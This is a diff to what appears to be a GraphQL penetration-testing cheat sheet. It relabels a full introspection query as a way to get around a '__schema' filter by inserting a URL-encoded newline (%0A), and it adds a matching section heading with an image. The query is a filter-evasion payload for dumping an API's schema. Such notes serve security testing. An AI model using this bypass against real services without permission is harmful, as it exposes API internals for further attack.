@@ -2272,7 +2272,7 @@ type Product {
 
 ----------------
 
-- Query-:
+- Introspection Query to bypass `__schema` filter with `__schema%0A`-:
 
 ```
 {__schema%0A{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name+description+locations+args{...InputValue}}}}fragment+FullType+on+__Type{kind+name+description+fields(includeDeprecated:true){name+description+args{...InputValue}type{...TypeRef}isDeprecated+deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name+description+isDeprecated+deprecationReason}possibleTypes{...TypeRef}}fragment+InputValue+on+__InputValue{name+description+type{...TypeRef}defaultValue}fragment+TypeRef+on+__Type{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name+ofType{kind+name}}}}}}}}
@@ -2337,6 +2337,15 @@ mutation {
 
 ---------------------
 
+### Bypassing introspection query `__schema` with %0A
+
+---------------------
+
+- Query-:
+
+![image](https://github.com/user-attachments/assets/32bdde35-149b-4b1d-881e-4bee3a691071)
+
+----------------------
 
 
 
